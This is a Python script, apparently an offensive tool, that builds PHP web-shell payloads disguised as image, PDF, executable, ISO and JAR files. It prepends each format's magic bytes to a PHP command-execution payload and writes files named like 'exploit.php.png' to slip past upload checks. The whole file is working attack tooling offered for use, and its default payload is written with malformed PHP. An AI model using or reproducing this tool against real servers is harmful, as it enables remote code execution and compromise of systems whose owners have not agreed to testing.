# ====================================================================================
# MIT License

# Copyright (c) 2020 Saket Upadhyay (x64mayhem)

# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

# ======================================================================================


# CHANGE THIS TO YOUR OWN PAYLOAD
payload="""

<?php echo _system(GET[dothis])>


"""




## =======================================================================================
import argparse as ap
payload=payload.encode()
PNG_magicBytes = '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52'
JPEG_magicBytes = '\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xDB\x00\x43\x00\x05\x03\x04\x04\x04\x03\x05\x04\x04\x04\x05\x05\x05\x06\x07\x0C\x08\x07\x07\x07\x07\x0F\x0B\x0B\x09\x0C\x11\x0F\x12\x12\x11\x0F\x11\x11\x13\x16\x1C\x17\x13\x14\x1A\x15\x11\x11\x18\x21\x18\x1A\x1D\x1D\x1F\x1F\x1F\x13\x17\x22\x24\x22\x1E\x24\x1C\x1E\x1F\x1E\xFF\xDB\x00\x43\x01\x05\x05\x05\x07\x06\x07\x0E\x08\x08\x0E\x1E\x14\x11\x14\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\x1E\xFF\xC2\x00\x11\x08\x04\x38\x07\x80\x03\x01\x22\x00\x02\x11\x01\x03\x11\x01\xFF\xC4\x00\x1C\x00\x00\x01\x05\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x03\x04\x05\x06\x07\x08\xFF\xC4\x00\x19\x01\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\xFF\xDA\x00\x0C\x03\x01\x00\x02\x10\x03\x10\x00\x00\x01\xEF\xAF\xE6\xCB\x66\x8B\x54\xB1\x06\x85\x4A\xEC\x98\x49\x21\x0B\xB0\xCC\x48\x04\x48\x14\xE9\x12'
PDF_magicBytes= '\x25\x50\x44\x46\x2D\x31\x2E\x33\x20\x0A\x31\x20\x30\x20\x6F\x62\x6A\x0A\x3C\x3C\x0A\x2F\x50\x61\x67\x65\x73\x20\x32\x20\x30\x20\x52\x0A\x2F\x54\x79\x70\x65\x20\x2F\x43\x61\x74\x61\x6C\x6F\x67\x0A\x3E\x3E'
BMP_magicBytes = '\x42\x4D\xB6\xD5\x5E\x00\x00\x00\x00\x00\x36\x00\x00\x00\x28\x00\x00\x00\x7F\x07\x00\x00\x37\x04\x00\x00\x01\x00\x18\x00\x00\x00\x00\x00\x80\xD5\x5E\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
EXE_magicBytes = '\x4D\x5A\x50\x00\x02\x00\x00\x00\x04\x00\x0F\x00\xFF\xFF\x00\x00\xB8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x1A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\xBA\x10\x00\x0E\x1F\xB4\x09\xCD\x21\xB8\x01\x4C\xCD\x21\x90\x90\x54\x68\x69\x73\x20\x70\x72\x6F\x67\x72\x61\x6D\x20\x6D\x75\x73\x74\x20\x62\x65\x20\x72\x75\x6E\x20\x75\x6E\x64\x65\x72\x20\x57\x69\x6E\x33\x32\x0D\x0A\x24\x37\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x50\x45\x00\x00\x4C\x01\x09\x00\x48\x5E\x44\x4B\x00\x00\x00\x00\x00\x00\x00\x00\xE0\x00\x8F\x81\x0B\x01\x02\x19\x00\x54\x01\x00\x00\xEC\x00\x00\x00\x00\x00\x00\xC4\x63\x01\x00\x00\x10\x00\x00\x00\x70\x01\x00\x00\x00\x40\x00\x00\x10\x00\x00\x00\x02\x00\x00\x05\x00\x00\x00\x06\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\xF0\x02\x00\x00\x04\x00\x00\x00\x00\x00\x00\x02\x00\x00\x80\x00\x00\x10\x00\x00\x40\x00\x00\x00\x00\x10\x00\x00\x10\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE0\x01\x00\x9E\x0F\x00\x00\x00\x30\x02\x00\x00\xB2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x50\xE3\x01\x00\x4C\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2E\x74\x65\x78\x74\x00\x00\x00\x18\x46\x01\x00\x00\x10\x00\x00\x00\x48\x01\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x60\x2E\x69\x74\x65\x78\x74\x00\x00\x34\x0B\x00\x00\x00\x60\x01\x00\x00\x0C\x00\x00\x00\x4C\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
ELF_magicBytes ='\x7F\x45\x4C\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3E\x00\x01\x00\x00\x00\x00\x10\x40\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x28\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x38\x00\x03\x00\x40\x00\x04\x00\x03\x00\x01\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x10\x40\x00\x00\x00\x00\x00\x00\x10\x40\x00\x00\x00\x00\x00\x25\x00\x00\x00\x00\x00\x00\x00\x25\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x20\x40\x00\x00\x00\x00\x00\x00\x20\x40\x00\x00\x00\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
GIF_magicBytes = '\x47\x49\x46\x38\x39\x61\x80\x07\x38\x04\xF7\x1F\x31\x00\x00\x00\x24\x00\x00\x48\x00\x00\x6C\x00\x00\x90\x00\x00\xB4\x00\x00\xD8\x00\x00\xFC\x00\x00\x00\x24\x00\x24\x24\x00\x48\x24\x00\x6C\x24\x00\x90\x24\x00\xB4\x24\x00\xD8\x24\x00\xFC\x24\x00\x00\x48\x00\x24\x48\x00\x48\x48\x00\x6C\x48\x00\x90\x48\x00\xB4\x48\x00\xD8\x48\x00\xFC\x48\x00\x00\x6C\x00\x24\x6C\x00\x48\x6C\x00\x6C\x6C\x00\x90\x6C\x00\xB4\x6C\x00\xD8\x6C\x00\xFC\x6C\x00\x00\x90\x00\x24\x90\x00\x48\x90\x00\x6C\x90\x00\x90\x90\x00\xB4\x90\x00\xD8\x90\x00\xFC\x90\x00\x00\xB4\x00\x24\xB4\x00\x48\xB4\x00\x6C\xB4\x00\x90\xB4\x00\xB4\xB4\x00\xD8\xB4\x00\xFC\xB4\x00\x00\xD8\x00\x24\xD8\x00\x48\xD8\x00\x6C\xD8\x00\x90\xD8\x00\xB4\xD8\x00\xD8\xD8\x00\xFC\xD8\x00\x00\xFC\x00\x24\xFC\x00\x48\xFC\x00\x6C\xFC\x00\x90\xFC\x00\xB4\xFC\x00\xD8\xFC\x00\xFC\xFC\x00\x00\x00\x55'
ISO_magicBytes= '\x45\x52\x08\x00\x00\x00\x90\x90\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x33\xED\xFA\x8E\xD5\xBC\x00\x7C\xFB\xFC\x66\x31\xDB\x66\x31\xC9\x66\x53\x66\x51\x06\x57\x8E\xDD\x8E\xC5\x52\xBE\x00\x7C\xBF\x00\x06\xB9\x00\x01\xF3\xA5\xEA\x4B\x06\x00\x00\x52\xB4\x41\xBB\xAA\x55\x31\xC9\x30\xF6\xF9\xCD\x13\x72\x16\x81\xFB\x55\xAA\x75\x10\x83\xE1\x01\x74\x0B\x66\xC7\x06\xF3\x06\xB4\x42\xEB\x15\xEB\x02\x31\xC9\x5A\x51\xB4\x08\xCD\x13\x5B\x0F\xB6\xC6\x40\x50\x83\xE1\x3F\x51\xF7\xE1\x53\x52\x50\xBB\x00\x7C\xB9\x04\x00\x66\xA1\xB0\x07\xE8\x44\x00\x0F\x82\x80\x00\x66\x40\x80\xC7\x02\xE2\xF2\x66\x81\x3E\x40\x7C\xFB\xC0\x78\x70\x75\x09\xFA\xBC\xEC\x7B\xEA\x44\x7C\x00\x00\xE8\x83\x00\x69\x73\x6F\x6C\x69\x6E\x75\x78\x2E\x62\x69\x6E\x20\x6D\x69\x73\x73\x69\x6E\x67\x20\x6F\x72\x20\x63\x6F\x72\x72\x75\x70\x74\x2E\x0D\x0A\x66\x60\x66\x31\xD2\x66\x03\x06\xF8\x7B\x66\x13\x16\xFC\x7B\x66\x52\x66\x50\x06\x53\x6A\x01\x6A\x10\x89\xE6\x66\xF7\x36\xE8\x7B\xC0\xE4\x06\x88\xE1\x88\xC5\x92\xF6\x36\xEE\x7B\x88\xC6\x08\xE1\x41\xB8\x01\x02\x8A\x16\xF2\x7B\xCD\x13\x8D\x64\x10\x66\x61\xC3\xE8\x1E\x00\x4F\x70\x65\x72\x61\x74\x69\x6E\x67\x20\x73\x79\x73\x74\x65\x6D\x20\x6C\x6F\x61\x64\x20\x65\x72\x72\x6F\x72\x2E\x0D\x0A\x5E\xAC\xB4\x0E\x8A\x3E\x62\x04\xB3\x07\xCD\x10\x3C\x0A\x75\xF1\xCD\x18\xF4\xEB\xFD\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x50\x03\x00\x00\x00\x00\x00\x00\xBF\xE7\xF8\x46\x00\x00\x80\x00\x01\x00\x00\x7C\xE0\xFF\x00\x00\x00\x00\x00\x80\x3E\x00\x00\xFE\xFF\xFF\xEF\xFE\xFF\xFF\xD4\x0D\x3E\x00\x40\x1D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x55\xAA\x45\x46\x49\x20\x50\x41\x52\x54\x00\x00\x01\x00\x5C\x00\x00\x00\x18\xC3\xDB\x8A\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xFF\x7F\x3E\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\xCA\x7F\x3E\x00\x00\x00\x00\x00\xFD\xDA\x9E\xE1\x6F\x16\xDA\x40\x92\x63\xA8\x12\x45\x5B\x56\x37\x0C\x00\x00\x00\x00\x00\x00\x00\xD0\x00\x00\x00\x80\x00\x00\x00\x9D\x50\x55\x69\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
JAR_magicBytes= '\x50\x4B\x03\x04\x0A\x00\x00\x08\x00\x00\x00\x00\x21\x3A\x0E\xB7\x11\xD3\x34\x01\x00\x00\x34\x01\x00\x00\x1D\x00\x0A\x00\x4D\x45\x54\x41\x2D\x49\x4E\x46\x2F\x63\x6F\x6D\x2F\x61\x6E\x64\x72\x6F\x69\x64\x2F\x6D\x65\x74\x61\x64\x61\x74\x61\xFE\xCA\x00\x00\x35\xD9\x02\x00\x00\x00\x6F\x74\x61\x2D\x70\x72\x6F\x70\x65\x72\x74\x79\x2D\x66\x69\x6C\x65\x73\x3D\x6D\x65\x74\x61\x64\x61\x74\x61\x3A\x36\x39\x3A\x33\x30\x38\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0A\x6F\x74\x61\x2D\x72\x65\x71\x75\x69\x72\x65\x64\x2D\x63\x61\x63\x68\x65\x3D\x30\x0A\x6F\x74\x61\x2D\x74\x79\x70\x65\x3D\x42\x4C\x4F\x43\x4B\x0A\x70\x6F\x73\x74\x2D\x62\x75\x69\x6C\x64\x3D\x67\x6F\x6F\x67\x6C\x65\x2F\x61\x6E\x67\x6C\x65\x72\x2F\x61\x6E\x67\x6C\x65\x72\x3A\x38\x2E\x31\x2E\x30\x2F\x4F\x50\x4D\x33\x2E\x31\x37\x31\x30\x31\x39\x2E\x30\x31\x34\x2F\x34\x35\x30\x33\x39\x39\x38\x3A\x75\x73\x65\x72\x2F\x72\x65\x6C\x65\x61\x73\x65\x2D\x6B\x65\x79\x73\x0A\x70\x6F\x73\x74\x2D\x62\x75\x69\x6C\x64\x2D\x69\x6E\x63\x72\x65\x6D\x65\x6E\x74\x61\x6C\x3D\x65\x6E\x67\x2E\x76\x6F\x69\x64\x7A\x2E\x32\x30\x31\x39\x30\x38\x30\x39\x2E\x32\x32\x35\x31\x34\x31\x0A\x70\x6F\x73\x74\x2D\x73\x64\x6B\x2D\x6C\x65\x76\x65\x6C\x3D\x32\x38\x0A\x70\x6F\x73\x74\x2D\x73\x65\x63\x75\x72\x69\x74\x79\x2D\x70\x61\x74\x63\x68\x2D\x6C\x65\x76\x65\x6C\x3D\x32\x30\x31\x39\x2D\x30\x38\x2D\x30\x31\x0A\x70\x6F\x73\x74\x2D\x74\x69\x6D\x65\x73\x74\x61\x6D\x70\x3D\x31\x35\x36\x35\x33\x35\x38\x36\x33\x36\x0A'




# FUNCTIONS FOR DIFFERENT 
def create_png(payload):
    with open("exploit.php.png","wb") as fb:
        fb.write(PNG_magicBytes+payload)

def create_jpeg(payload):
    with open("exploit.php.jpg","wb") as fb:
        fb.write(JPEG_magicBytes+payload)

def create_exe(payload):
    with open("exploit.php.exe","wb") as fb:
        fb.write(EXE_magicBytes+payload)

def create_elf(payload):
    with open("exploit.php.o","wb") as fb:
        fb.write(ELF_magicBytes+payload)

def create_gif(payload):
    with open("exploit.php.gif","wb") as fb:
        fb.write(GIF_magicBytes+payload)

def create_bmp(payload):
    with open("exploit.php.bmp","wb") as fb:
        fb.write(BMP_magicBytes+payload)

def create_iso(payload):
    with open("exploit.php.iso","wb") as fb:
        fb.write(ISO_magicBytes+payload)


def create_jar(payload):
    with open("exploit.php.jar","wb") as fb:
        fb.write(JAR_magicBytes+payload)

def create_pdf(payload):
    with open("exploit.php.pdf","wb") as fb:
        fb.write(PDF_magicBytes+payload)



parser = ap.ArgumentParser(description='Script to create PHP Payloads with custom file signatures', epilog='~ with <3 by X64M')

parser.add_argument('-s', '--signature', metavar='target_signature', action='store' , type=str,
        help='accepted inputs : png,jpg,exe,elf,gif,bmp,jar,pdf,iso')

args = parser.parse_args()
sig_select = args.signature

if(sig_select == 'png'):
    create_png(payload)
    print("DONE")
elif(sig_select == 'bmp'):
    create_bmp(payload)
    print("DONE")
elif(sig_select == 'jpg'):
    create_jpeg(payload)
    print("DONE")
elif(sig_select == 'gif'):
    create_gif(payload)
    print("DONE")
elif(sig_select == 'exe'):
    create_exe(payload)
    print("DONE")
elif(sig_select == 'elf'):
    create_elf(payload)
    print("DONE")
elif(sig_select == 'iso'):
    create_iso(payload)
    print("DONE")
elif(sig_select == 'jar'):
    create_jar(payload)
    print("DONE")
elif(sig_select == 'pdf'):
    create_pdf(payload)
    print("DONE")
else:
    print("Requested Signature not Recogonised")










